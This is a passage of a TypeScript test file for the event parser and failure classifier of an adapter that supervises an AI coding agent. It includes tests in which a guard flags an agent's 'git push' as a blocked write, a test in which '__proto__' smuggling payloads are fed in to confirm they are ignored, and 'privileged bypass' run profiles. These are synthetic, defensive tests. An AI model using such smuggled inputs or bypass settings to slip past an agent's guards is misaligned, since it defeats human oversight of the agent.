  it("fixture backing_provider replays structured backing vendor and model on session_bound", async () => {
    const report = await runConformanceCase(
      replayCase("backing_provider", "success", { ok: true, nativeSessionId: DEFAULT_SESSION_ID }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, nativeSessionId: DEFAULT_SESSION_ID });
  });

  it("fixture git_write_guard_args replays args.CommandLine Git write to PERMISSION_BLOCKED (ADR-0039)", async () => {
    const report = await runConformanceCase(
      replayCase("git_write_guard_args", "task_failure", {
        ok: false,
        failureCode: "PERMISSION_BLOCKED",
        nativeSessionId: DEFAULT_SESSION_ID,
      }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(report.result?.failureDetail).toContain("git write attempted");
  });

  // Whole-stream order, mirroring Grok Build T4.23 (`unknown_then_end`, `error_after_end`, `malformed_after_end`).
  // Outside the T4.35 case list. Antigravity has no separate error event: a late auth envelope is a second `result`.
  it("fixture unknown_then_result counts an unknown shape and binds only the later result's conversation id", async () => {
    const report = await runConformanceCase(
      replayCase("unknown_then_result", "success", { ok: true, nativeSessionId: DEFAULT_SESSION_ID }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: true,
      nativeSessionId: DEFAULT_SESSION_ID,
      unknownEventCount: 1,
      summary: "SYNTHETIC: recognized turn.",
    });
    const events = fixtureEvents("unknown_then_result");
    expect(events.filter((e) => e.kind === "session_bound")).toEqual([
      { kind: "session_bound", nativeSessionId: DEFAULT_SESSION_ID },
    ]);
    expect(JSON.stringify(events)).not.toContain("must-not-bind");
  });

  it("fixture error_after_result stays OUTPUT_PROTOCOL_ERROR: a late auth envelope is a second result, not AUTH_REQUIRED", async () => {
    const report = await runConformanceCase(
      replayCase("error_after_result", "malformed_output", {
        ok: false,
        failureCode: "OUTPUT_PROTOCOL_ERROR",
        nativeSessionId: DEFAULT_SESSION_ID,
      }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "protocol: more than one result line",
      nativeSessionId: DEFAULT_SESSION_ID,
      unknownEventCount: 0,
    });
    expect(report.result?.failureDetail).not.toContain("auth:");
    const events = fixtureEvents("error_after_result");
    expect(events.filter((e) => e.kind === "usage")).toHaveLength(1);
    expect(events.filter((e) => e.kind === "usage")).toEqual([
      {
        kind: "usage",
        source: "provider_reported",
        metrics: { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 },
      },
    ]);
  });

  it("fixture malformed_after_result fails in the supervisor after the result was emitted and keeps the conversation id", async () => {
    const parsed = fixtureEvents("malformed_after_result");
    expect(parsed.some((e) => e.kind === "result" && e.ok)).toBe(true);
    expect(parsed.find((e) => e.kind === "session_bound")).toMatchObject({ nativeSessionId: DEFAULT_SESSION_ID });
    const report = await runConformanceCase(
      replayCase("malformed_after_result", "malformed_output", {
        ok: false,
        failureCode: "OUTPUT_PROTOCOL_ERROR",
        nativeSessionId: DEFAULT_SESSION_ID,
      }),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "unparseable provider output",
      nativeSessionId: DEFAULT_SESSION_ID,
      unknownEventCount: 0,
    });
  });
});

/**
 * T4.33: parser branches with no test until now (2026-10-15, Delegated, not owner-approved). SYNTHETIC lines; no new
 * capture and the parser is unchanged. Each pins what `parseEvent` does today with a field shape the live check did
 * not record, so a capture that differs breaks a named test rather than passing silently.
 */
describe("antigravity parser fallbacks and exact matching (T4.33, synthetic shapes)", () => {
  const CID = "0b6c2d1e-0000-4000-8000-00000000000f";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const INIT = j({ event: "init", conversation_id: CID, init: { cwd: "/work/tree" } });
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const RESULT = (over: Record<string, unknown> = {}) =>
    j({ event: "result", result: { conversation_id: CID, status: "SUCCESS", response: "ok", usage: USAGE, ...over } });
  const TOOL = (index: number, extra: Record<string, unknown>) =>
    j({ event: "step_update", conversation_id: CID, step_index: index, state: "ACTIVE", step_type: "tool", ...extra });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  const parse = (lines: string[], exit: ExitInfo = EXIT0) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const events: NormalizedEvent[] = lines.flatMap((l) => a.parseEvent(l, state));
    return { state, events, result: a.extractResult(events, exit) };
  };
  const calls = (events: readonly NormalizedEvent[]) => events.filter((e) => e.kind === "tool_call");

  it("each Assumption parameter key reaches the guard: CommandLine as a command, file_path and AbsolutePath as paths", () => {
    // protocol.ts: the keys of `tool_info.parameters` were not recorded (T4.33 "Not done" (3)); these are the aliases
    // the parser reads besides `command` and `path`.
    const { events } = parse([
      INIT,
      TOOL(1, { tool_info: { name: "run_command", parameters: { CommandLine: "git push origin main" } } }),
      TOOL(2, { tool_info: { name: "write_to_file", parameters: { file_path: "/work/tree/a.txt" } } }),
      TOOL(3, { tool_info: { name: "view_file", parameters: { AbsolutePath: "/work/tree/b.txt" } } }),
      RESULT(),
    ]);
    expect(calls(events)).toEqual([
      { kind: "tool_call", tool: "shell", name: "run_command", command: "git push origin main" },
      { kind: "tool_call", tool: "other", name: "write_to_file", target: "/work/tree/a.txt" },
      { kind: "tool_call", tool: "other", name: "view_file", target: "/work/tree/b.txt" },
    ]);
    const guarded = events.map((e) => guardEvent(e, { cwd: "/work/tree", home: "/home/synthetic", bypass: true }));
    expect(guarded[1]).toMatchObject({ kind: "tool_call", violation: expect.anything() });
  });

  it("`command` is reported before `CommandLine` and `path` before the aliases, every distinct value reaches the guard, and a command drops the path from the report", () => {
    const { events, result } = parse([
      INIT,
      TOOL(1, {
        tool_info: { name: "run_command", parameters: { command: "ls", CommandLine: "git push origin main" } },
      }),
      TOOL(2, { tool_info: { name: "edit", parameters: { path: "/a", file_path: "/b", AbsolutePath: "/c" } } }),
      TOOL(3, { tool_info: { name: "edit", parameters: { file_path: "/b", AbsolutePath: "/b" } } }),
      TOOL(4, { tool_info: { name: "run_command", parameters: { command: "ls", path: "/work/tree" } } }),
      RESULT(),
    ]);
    expect(calls(events)).toEqual([
      { kind: "tool_call", tool: "shell", name: "run_command", command: "ls" },
      { kind: "tool_call", tool: "shell", name: "run_command", command: "git push origin main" },
      { kind: "tool_call", tool: "other", name: "edit", target: "/a" },
      { kind: "tool_call", tool: "other", name: "edit", target: "/b" },
      { kind: "tool_call", tool: "other", name: "edit", target: "/c" },
      { kind: "tool_call", tool: "other", name: "edit", target: "/b" },
      { kind: "tool_call", tool: "shell", name: "run_command", command: "ls" },
    ]);
    // The parser alone does not judge; the guard verdict on the lower-precedence Git write is checked below.
    expect(result.ok).toBe(true);
  });

  it("the tool name falls back from tool_info.name to tool_name to `unknown`; names and paths are clipped", () => {
    const longPath = `/work/tree/${"p".repeat(600)}`;
    const { events } = parse([
      INIT,
      TOOL(1, { tool_name: "outer", tool_info: { name: "inner" } }),
      TOOL(2, { tool_name: "outer", tool_info: { name: 7 } }),
      TOOL(3, {}),
      TOOL(4, { tool_info: { name: "n".repeat(100), parameters: { path: longPath } } }),
      RESULT(),
    ]);
    const reported = calls(events);
    expect(reported.slice(0, 3).map((e) => (e.kind === "tool_call" ? e.name : undefined))).toEqual([
      "inner",
      "outer",
      "unknown",
    ]);
    expect(reported[3]).toEqual({
      kind: "tool_call",
      tool: "other",
      name: `${"n".repeat(64)}…`,
      target: `${longPath.slice(0, 512)}…`,
    });
  });

  it("a denied entry is named by display_name, then action, then `unknown`; non-object entries still deny", () => {
    const { events, result } = parse([
      INIT,
      RESULT({
        denied_actions: [
          { action: "command", display_name: "RunCommand" },
          { action: "command" },
          { display_name: 3, action: "write" },
          {},
          "RunCommand",
          null,
          { display_name: "D".repeat(100) },
        ],
      }),
    ]);
    expect(events.flatMap((e) => (e.kind === "permission_denied" ? [e.tool] : []))).toEqual([
      "RunCommand",
      "command",
      "write",
      "unknown",
      "unknown",
      "unknown",
      `${"D".repeat(64)}…`,
    ]);
    expect(result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("error prefixes match case-sensitively at the start only; anything else is TOOL_FAILURE with a clipped message", () => {
    const exit1: ExitInfo = { ...EXIT0, exitCode: 1 };
    for (const error of [
      "Invalid model selection (--model x)",
      " invalid model selection",
      "error: invalid model selection",
      "Authentication failed or timed out",
      "AUTHENTICATION FAILED",
      "login: authentication failed",
    ]) {
      const r = parse([INIT, RESULT({ status: "ERROR", response: "", error })], exit1);
      expect(r.result, error).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
      expect(r.events, error).toContainEqual({ kind: "provider_error", category: "unknown", message: error });
    }
    const long = `invalid model selection ${"m".repeat(3_000)}`;
    const r = parse([INIT, RESULT({ status: "ERROR", response: "", error: long })], exit1);
    expect(r.result).toMatchObject({ ok: false, failureCode: "MODEL_UNAVAILABLE" });
    expect(r.events).toContainEqual({
      kind: "provider_error",
      category: "model_unavailable",
      message: `${long.slice(0, 2_000)}…`,
    });
  });

  it("a result with no init binds the envelope's id; a non-string status is an unknown line and never succeeds", () => {
    const alone = parse([RESULT()]);
    expect(alone.events[0]).toEqual({ kind: "session_bound", nativeSessionId: CID });
    expect(alone.result).toMatchObject({ ok: true, nativeSessionId: CID });
    for (const status of [1, null, true, { s: "SUCCESS" }, ["SUCCESS"]]) {
      const r = parse([INIT, RESULT({ status })]);
      expect(r.state.unknownEvents, JSON.stringify(status)).toBe(1);
      expect(r.events.some((e) => e.kind === "result" || e.kind === "usage")).toBe(false);
      expect(r.result, JSON.stringify(status)).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
    }
  });

  it("init.model is kept only as a string and clipped; a non-string model binds the id without one", () => {
    const bound = (model: unknown) =>
      parse([j({ event: "init", conversation_id: CID, init: { model } }), RESULT()]).events[0];
    expect(bound("m".repeat(200))).toEqual({
      kind: "session_bound",
      nativeSessionId: CID,
      model: `${"m".repeat(128)}…`,
    });
    for (const model of [7, null, { id: "x" }, ""]) {
      expect(bound(model), JSON.stringify(model)).toEqual({ kind: "session_bound", nativeSessionId: CID });
    }
  });

  it("a long response is clipped, then the summary keeps its last 2,000 characters; an empty or non-string one is none", () => {
    // The message is clipped to 2,000 characters plus `…` and `extractResult` keeps the tail, so the first character
    // drops; pinned as is.
    const long = `x${"a".repeat(1_998)}bc`;
    const summary = parse([INIT, RESULT({ response: long })]).result.summary;
    expect(summary).toBe(`${"a".repeat(1_998)}b…`);
    expect(summary).toHaveLength(2_000);
    for (const response of ["", 5, null, ["ok"]]) {
      const r = parse([INIT, RESULT({ response })]).result;
      expect(r, JSON.stringify(response)).toMatchObject({ ok: true });
      expect(r, JSON.stringify(response)).not.toHaveProperty("summary");
    }
  });

  it("harness and backing provider mismatch per T4.6 (FR-ADP-10): structured backing_provider is reported, never derived from display name", async () => {
    // 1. Without backing_provider in init: backingProvider is unset
    const standard = parse([INIT, RESULT()]);
    const standardBound = standard.events.find((e) => e.kind === "session_bound");
    expect(standardBound).toBeDefined();
    expect(standardBound).not.toHaveProperty("backingProvider");
    expect(standardBound).not.toHaveProperty("model");

    // 2. With backing_provider and model in init (T4.6: harness 'antigravity' fronting another provider, e.g. 'backing-g'):
    const fronted = parse([
      j({
        event: "init",
        conversation_id: CID,
        backing_provider: "backing-g",
        init: { cwd: "/work/tree", model: "Synthetic Gemini 1" },
      }),
      RESULT(),
    ]);
    const frontedBound = fronted.events.find((e) => e.kind === "session_bound");
    expect(frontedBound).toEqual({
      kind: "session_bound",
      nativeSessionId: CID,
      model: "Synthetic Gemini 1",
      backingProvider: "backing-g",
    });

    // 3. Alternative camelCase spelling backingProvider is accepted in init or result
    const camel = parse([
      j({
        event: "init",
        conversation_id: CID,
        backingProvider: "backing-h",
        init: { cwd: "/work/tree", model: "Synthetic Gemini 2" },
      }),
      RESULT(),
    ]);
    expect(camel.events.find((e) => e.kind === "session_bound")).toEqual({
      kind: "session_bound",
      nativeSessionId: CID,
      model: "Synthetic Gemini 2",
      backingProvider: "backing-h",
    });

    // 4. Structured backing_provider and model in result envelope when init had none
    const inResult = parse([
      j({ event: "init", conversation_id: CID, init: { cwd: "/work/tree" } }),
      RESULT({ backing_provider: "backing-r", model: "Result Model" }),
    ]);
    // The session is bound on init; result does not re-bind already bound session
    expect(inResult.events.find((e) => e.kind === "session_bound")).toEqual({
      kind: "session_bound",
      nativeSessionId: CID,
    });

    // 4b. When result arrives with no prior init, it binds backingProvider and model
    const aloneWithBacking = parse([RESULT({ backing_provider: "backing-r", model: "Result Model" })]);
    expect(aloneWithBacking.events.find((e) => e.kind === "session_bound")).toEqual({
      kind: "session_bound",
      nativeSessionId: CID,
      model: "Result Model",
      backingProvider: "backing-r",
    });

    // 5. Non-string model and backing_provider are dropped, not coerced
    const nonStr = parse([
      j({
        event: "init",
        conversation_id: CID,
        backing_provider: 12345,
        init: { cwd: "/work/tree", model: { id: "invalid" } },
      }),
      RESULT(),
    ]);
    expect(nonStr.events.find((e) => e.kind === "session_bound")).toEqual({
      kind: "session_bound",
      nativeSessionId: CID,
    });

    // 6. Long strings are clipped to 128 characters
    const longVal = "x".repeat(150);
    const clipped = parse([
      j({
        event: "init",
        conversation_id: CID,
        backing_provider: longVal,
        init: { cwd: "/work/tree", model: longVal },
      }),
      RESULT(),
    ]);
    expect(clipped.events.find((e) => e.kind === "session_bound")).toEqual({
      kind: "session_bound",
      nativeSessionId: CID,
      model: `${"x".repeat(128)}…`,
      backingProvider: `${"x".repeat(128)}…`,
    });

    // 7. End-to-end usage observation records harness 'antigravity' alongside backingProvider 'backing-g' (T4.6, FR-ADP-10)
    const usageRows = usageObservationsFromEvents(fronted.events, {
      runId: "run_t46_antigravity",
      provider: "antigravity",
    });
    expect(usageRows).toHaveLength(1);
    expect(usageRows[0]).toMatchObject({
      runId: "run_t46_antigravity",
      provider: "antigravity",
      harness: "antigravity",
      backingProvider: "backing-g",
      model: "Synthetic Gemini 1",
      metrics: { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 },
    });

    // 8. Replay backing_provider fixture end to end through supervisor
    const report = await runConformanceCase({
      kind: "success",
      adapter: replayAdapter("backing_provider"),
      request: {
        runId: "run_antigravity_backing_provider",
        objective: "synthetic antigravity objective",
        constraints: [],
        workspace: { cwd: makeCwd(), writable: true },
        bypassApproved: true,
      },
      profile: PRIVILEGED_BYPASS_PROFILE,
      expect: { ok: true, nativeSessionId: DEFAULT_SESSION_ID },
    });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: true,
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("prototype safety (ownProp): inherited prototype properties or __proto__ smuggling are never read as event fields", () => {
    // Top-level event smuggling via JSON.parse __proto__
    const protoSmuggled = parse(['{"__proto__":{"event":"init"}}']);
    expect(protoSmuggled.state.unknownEvents).toBe(1);
    expect(protoSmuggled.events).toEqual([{ kind: "unknown", rawType: "none" }]);

    // Tool call parameter prototype pollution: properties not directly on params are ignored
    const cleanTool = parse([
      INIT,
      j({
        event: "step_update",
        conversation_id: CID,
        step_index: 1,
        state: "ACTIVE",
        step_type: "tool",
        tool_info: {
          name: "custom_tool",
          parameters: Object.create({ command: "git push origin main", path: "/escaped" }),
        },
      }),
      RESULT(),
    ]);
    const tc = cleanTool.events.find((e) => e.kind === "tool_call");
    expect(tc).toMatchObject({
      kind: "tool_call",
      tool: "other",
      name: "custom_tool",
    });
    expect(tc).not.toHaveProperty("command");
    expect(tc).not.toHaveProperty("target");
  });

  it("parameter container fallback (parameters > args > input) and alias precedence", () => {
    // Command precedence: command > CommandLine
    const p1 = parse([
      INIT,
      TOOL(1, {
        tool_info: {
          name: "run_command",
          parameters: { command: "cmd1", CommandLine: "cmd2" },
        },
      }),
      RESULT(),
    ]);
    expect(p1.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "shell",
      command: "cmd1",
    });

    const p2 = parse([
      INIT,
      TOOL(1, {
        tool_info: {
          name: "run_command",
          parameters: { CommandLine: "cmd2" },
        },
      }),
      RESULT(),
    ]);
    expect(p2.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "shell",
      command: "cmd2",
    });

    // Container fallback: args > parameters > input on tool_info
    const pArgs = parse([
      INIT,
      TOOL(1, {
        tool_info: {
          name: "run_command",
          args: { command: "cmd_from_args" },
        },
      }),
      RESULT(),
    ]);
    expect(pArgs.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "shell",
      command: "cmd_from_args",
    });

    const pInput = parse([
      INIT,
      TOOL(1, {
        tool_info: {
          name: "run_command",
          input: { command: "cmd_from_input" },
        },
      }),
      RESULT(),
    ]);
    expect(pInput.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "shell",
      command: "cmd_from_input",
    });

    // Container fallback on step_update level when tool_info is absent or empty
    const pStepLevel = parse([
      INIT,
      j({
        event: "step_update",
        conversation_id: CID,
        step_index: 1,
        state: "ACTIVE",
        step_type: "tool",
        tool_name: "step_tool",
        parameters: { command: "cmd_from_step" },
      }),
      RESULT(),
    ]);
    expect(pStepLevel.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "shell",
      name: "step_tool",
      command: "cmd_from_step",
    });

    // Target precedence: path > file_path > AbsolutePath
    const pTarget1 = parse([
      INIT,
      TOOL(1, {
        tool_info: {
          name: "read_file",
          parameters: { path: "p1", file_path: "p2", AbsolutePath: "p3" },
        },
      }),
      RESULT(),
    ]);
    expect(pTarget1.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "other",
      target: "p1",
    });

    const pTarget2 = parse([
      INIT,
      TOOL(1, {
        tool_info: {
          name: "read_file",
          parameters: { file_path: "p2", AbsolutePath: "p3" },
        },
      }),
      RESULT(),
    ]);
    expect(pTarget2.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "other",
      target: "p2",
    });

    const pTarget3 = parse([
      INIT,
      TOOL(1, {
        tool_info: {
          name: "read_file",
          parameters: { AbsolutePath: "p3" },
        },
      }),
      RESULT(),
    ]);
    expect(pTarget3.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      tool: "other",
      target: "p3",
    });

    // Tool name fallback: tool_info.name > step.tool_name > step.name > "unknown"
    const pNameFallback = parse([
      INIT,
      j({
        event: "step_update",
        conversation_id: CID,
        step_index: 1,
        state: "ACTIVE",
        step_type: "tool",
        name: "fallback_name",
        parameters: { path: "/x" },
      }),
      RESULT(),
    ]);
    expect(pNameFallback.events.find((e) => e.kind === "tool_call")).toMatchObject({
      kind: "tool_call",
      name: "fallback_name",
    });
  });

  it("extractResult classifies supervisor exit outcomes (protocol_error, internal_error, crashed, spawn_error, timeout, cancelled)", () => {
    const baseExit = { exitCode: null, signal: null, expectedExitCodes: [0] };

    const proto = adapter().extractResult([], { ...baseExit, outcome: "protocol_error" });
    expect(proto).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "unparseable provider output",
    });

    const internal = adapter().extractResult([], { ...baseExit, outcome: "internal_error" });
    expect(internal).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "event handling failed",
    });

    const crashedSig = adapter().extractResult([], { ...baseExit, outcome: "crashed", signal: "SIGKILL" });
    expect(crashedSig).toMatchObject({
      ok: false,
      failureCode: "PROCESS_CRASH",
      failureDetail: "signal SIGKILL",
    });

    const crashedNoSig = adapter().extractResult([], { ...baseExit, outcome: "crashed", signal: null });
    expect(crashedNoSig).toMatchObject({
      ok: false,
      failureCode: "PROCESS_CRASH",
      failureDetail: "crashed",
    });

    const spawnErr = adapter().extractResult([], { ...baseExit, outcome: "spawn_error" });
    expect(spawnErr).toMatchObject({
      ok: false,
      failureCode: "PROCESS_CRASH",
      failureDetail: "spawn_error",
    });

    const timeout = adapter().extractResult([], { ...baseExit, outcome: "timeout", timeoutKind: "wall_clock" });
    expect(timeout).toMatchObject({
      ok: false,
      failureCode: "PROCESS_TIMEOUT",
      failureDetail: "wall_clock timeout",
    });

    const cancelled = adapter().extractResult([], { ...baseExit, outcome: "cancelled" });
    expect(cancelled).toMatchObject({
      ok: false,
      failureCode: "CANCELLED",
      failureDetail: "run cancelled",
    });

    const exitErr = adapter().extractResult([], {
      outcome: "exited",
      exitCode: 2,
      signal: null,
      expectedExitCodes: [0],
    });
    expect(exitErr).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      failureDetail: "exit code 2",
    });
  });

  it("extractResult honors normalized failure events (permission_denied, sandbox_violation, rate_limit)", () => {
    const endEvent: NormalizedEvent = { kind: "result", ok: true };

    const perm = adapter().extractResult([{ kind: "permission_denied", tool: "run_command" }, endEvent], EXIT0);
    expect(perm).toMatchObject({
      ok: false,
      failureCode: "PERMISSION_BLOCKED",
      failureDetail: "denied: run_command",
    });

    const sbx = adapter().extractResult([{ kind: "sandbox_violation", detail: "out of worktree" }, endEvent], EXIT0);
    expect(sbx).toMatchObject({ ok: false, failureCode: "SANDBOX_VIOLATION", failureDetail: "out of worktree" });

    const rl = adapter().extractResult([{ kind: "rate_limit" }, endEvent], EXIT0);
    expect(rl).toMatchObject({
      ok: false,
      failureCode: "RATE_LIMIT_TRANSIENT",
      failureDetail: "rate limit reported",
    });
  });

  it("classifyFailure precedence: supervisor outcomes over the guard, the guard over denials, denials over provider errors, a provider error over a rate_limit event, a failed result and the exit code", () => {
    // The parser emits no rate_limit (no recorded shape). This pins classifyCommon's order on normalized events,
    // including the Antigravity `protocol` category, the way Grok Build T4.23 does.
    const a = adapter();
    const evidence = (
      events: readonly NormalizedEvent[],
      exit: Partial<FailureEvidence["exit"]> = {},
      extra: Partial<FailureEvidence> = {},
    ): FailureEvidence => ({
      events,
      exit: { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0], ...exit },
      stderrTail: "",
      timedOut: false,
      cancelled: false,
      ...extra,
    });
    const GUARDED: NormalizedEvent = {
      kind: "tool_call",
      tool: "shell",
      name: "run_command",
      command: "git push origin main",
      violation: { kind: "git_write", reason: "git push origin main" },
    };
    const DENIED: NormalizedEvent = { kind: "permission_denied", tool: "run_command" };
    const AUTH: NormalizedEvent = {
      kind: "provider_error",
      category: "auth",
      message: "authentication failed or timed out",
    };
    const UNKNOWN_ERR: NormalizedEvent = { kind: "provider_error", category: "unknown", message: "boom" };
    const PROTOCOL_ERR: NormalizedEvent = {
      kind: "provider_error",
      category: "protocol",
      message: "more than one result line",
    };
    const FAILED_RESULT: NormalizedEvent = { kind: "result", ok: false, summary: "ERROR" };
    const EXIT_1 = { exitCode: 1 };

    expect(a.classifyFailure(evidence([GUARDED], { outcome: "cancelled" }))).toEqual({
      code: "CANCELLED",
      detail: "run cancelled",
    });
    expect(a.classifyFailure(evidence([GUARDED], {}, { cancelled: true }))).toEqual({
      code: "CANCELLED",
      detail: "run cancelled",
    });
    expect(a.classifyFailure(evidence([GUARDED], {}, { timedOut: true }))).toEqual({
      code: "PROCESS_TIMEOUT",
      detail: "unknown timeout",
    });
    expect(a.classifyFailure(evidence([GUARDED], { outcome: "protocol_error", exitCode: null }))).toEqual({
      code: "OUTPUT_PROTOCOL_ERROR",
      detail: "unparseable provider output",
    });
    expect(a.classifyFailure(evidence([GUARDED], { outcome: "internal_error", exitCode: null }))).toEqual({
      code: "OUTPUT_PROTOCOL_ERROR",
      detail: "event handling failed",
    });
    expect(a.classifyFailure(evidence([GUARDED], { outcome: "crashed", exitCode: null, signal: "SIGKILL" }))).toEqual({
      code: "PROCESS_CRASH",
      detail: "signal SIGKILL",
    });
    expect(a.classifyFailure(evidence([GUARDED], { outcome: "spawn_error", exitCode: null }))).toEqual({
      code: "PROCESS_CRASH",
      detail: "spawn_error",
    });

    expect(a.classifyFailure(evidence([GUARDED, DENIED]))).toEqual({
      code: "PERMISSION_BLOCKED",
      detail: "git write attempted: git push origin main",
    });
    expect(
      a.classifyFailure(
        evidence([{ ...GUARDED, violation: { kind: "provider_state", reason: "synthetic" } }, DENIED, AUTH]),
      ),
    ).toEqual({ code: "SANDBOX_VIOLATION", detail: "provider state reached: synthetic" });

    expect(a.classifyFailure(evidence([DENIED, AUTH], EXIT_1))).toEqual({
      code: "PERMISSION_BLOCKED",
      detail: "denied: run_command",
    });
    expect(
      a.classifyFailure(evidence([{ kind: "sandbox_violation", detail: "out of worktree" }, UNKNOWN_ERR])),
    ).toEqual({ code: "SANDBOX_VIOLATION", detail: "out of worktree" });

    expect(a.classifyFailure(evidence([UNKNOWN_ERR, { kind: "rate_limit" }]))).toEqual({
      code: "TOOL_FAILURE",
      detail: "unknown: boom",
    });
    expect(a.classifyFailure(evidence([AUTH, FAILED_RESULT]))).toEqual({
      code: "AUTH_REQUIRED",
      detail: "auth: authentication failed or timed out",
    });
    expect(a.classifyFailure(evidence([PROTOCOL_ERR], EXIT_1))).toEqual({
      code: "OUTPUT_PROTOCOL_ERROR",
      detail: "protocol: more than one result line",
    });

    expect(a.classifyFailure(evidence([{ kind: "rate_limit" }], EXIT_1))).toEqual({
      code: "RATE_LIMIT_TRANSIENT",
      detail: "rate limit reported",
    });
    expect(a.classifyFailure(evidence([FAILED_RESULT], EXIT_1))).toEqual({
      code: "TOOL_FAILURE",
      detail: "ERROR",
    });
    expect(a.classifyFailure(evidence([], EXIT_1))).toEqual({ code: "TOOL_FAILURE", detail: "exit code 1" });
    expect(a.classifyFailure(evidence([]))).toEqual({
      code: "OUTPUT_PROTOCOL_ERROR",
      detail: "no result event",
    });
  });

  it("seenResults and seenToolSteps WeakMap state is isolated across separate ParseState instances", () => {
    const a = adapter();
    const state1: ParseState = { lines: 0, unknownEvents: 0 };
    const state2: ParseState = { lines: 0, unknownEvents: 0 };

    // Result line on state1
    const ev1 = a.parseEvent(RESULT(), state1);
    expect(ev1.some((e) => e.kind === "result" && e.ok)).toBe(true);

    // Result line on fresh state2 is also a first result line, not a second duplicate
    const ev2 = a.parseEvent(RESULT(), state2);
    expect(ev2.some((e) => e.kind === "result" && e.ok)).toBe(true);
    expect(ev2.some((e) => e.kind === "provider_error")).toBe(false);

    // Second result line on state1 triggers protocol error
    const ev1Second = a.parseEvent(RESULT(), state1);
    expect(ev1Second.some((e) => e.kind === "provider_error" && e.category === "protocol")).toBe(true);

    // Tool steps across state1 and state2 are tracked independently
    const toolLine = TOOL(1, { tool_info: { name: "tool1", parameters: { command: "echo independent" } } });
    const tc1 = a.parseEvent(toolLine, state1);
    expect(tc1.some((e) => e.kind === "tool_call")).toBe(true);
    const tc2 = a.parseEvent(toolLine, state2);
    expect(tc2.some((e) => e.kind === "tool_call")).toBe(true);
  });

  it("bounds and clipping fallbacks: tool name > 64 chars, target > 512 chars, denied action > 64 chars, result summary > 64 chars, model > 128 chars, backingProvider > 128 chars", () => {
    const longName = "custom_tool_name_".repeat(5); // 85 chars
    const longPath = `/work/tree/${"p".repeat(600)}`;
    const rTool = parse([INIT, TOOL(1, { tool_info: { name: longName, parameters: { path: longPath } } }), RESULT()]);
    const tc = rTool.events.find((e) => e.kind === "tool_call");
    expect(tc).toMatchObject({
      kind: "tool_call",
      name: `${longName.slice(0, 64)}…`,
      target: `${longPath.slice(0, 512)}…`,
    });

    const longDenied = "denied_action_".repeat(6);
    const rDenied = parse([INIT, RESULT({ denied_actions: [{ display_name: longDenied }] })]);
    const pd = rDenied.events.find((e) => e.kind === "permission_denied");
    expect(pd).toMatchObject({
      kind: "permission_denied",
      tool: `${longDenied.slice(0, 64)}…`,
    });

    const longStatus = `custom_error_status_${"s".repeat(80)}`;
    const rStatus = parse([INIT, RESULT({ status: longStatus })]);
    const res = adapter().extractResult(rStatus.events, EXIT0);
    expect(res).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      failureDetail: `${longStatus.slice(0, 64)}…`,
    });

    const longModel = "M".repeat(200);
    const longBacking = "B".repeat(200);
    const rInit = parse([
      j({
        event: "init",
        conversation_id: CID,
        backing_provider: longBacking,
        init: { cwd: "/work/tree", model: longModel },
      }),
      RESULT(),
    ]);
    const bound = rInit.events.find((e) => e.kind === "session_bound");
    expect(bound).toMatchObject({
      kind: "session_bound",
      model: `${longModel.slice(0, 128)}…`,
      backingProvider: `${longBacking.slice(0, 128)}…`,
    });
  });

  it("resumeArgs comprehensive matrix: foreign provider refusals, ineligible profiles, and safe/unsafe session ids", () => {
    const a = adapter();
    const profile = privilegedProfile(BYPASS_SCOPE);
    const approved = { ...profile, bypassApproved: true };
    const customReq = request({ workspace: { cwd: "/custom/workspace/dir", writable: true }, bypassApproved: true });
    const id = "0b6c2d1e-0000-4000-8000-000000000042";

    // Antigravity bindings compile in the approved bypass cell, with the id after --conversation (owner decision 67)
    const res = a.resumeArgs({ provider: "antigravity", nativeSessionId: id }, customReq, approved);
    if (isIneligible(res)) throw new Error(res.detail);
    expect(res.argv.slice(-2)).toEqual(["--conversation", id]);
    expect(res.cwd).toBe("/custom/workspace/dir");
    expect(res.resumeNativeSessionId).toBe(id);

    // Foreign provider bindings rejected
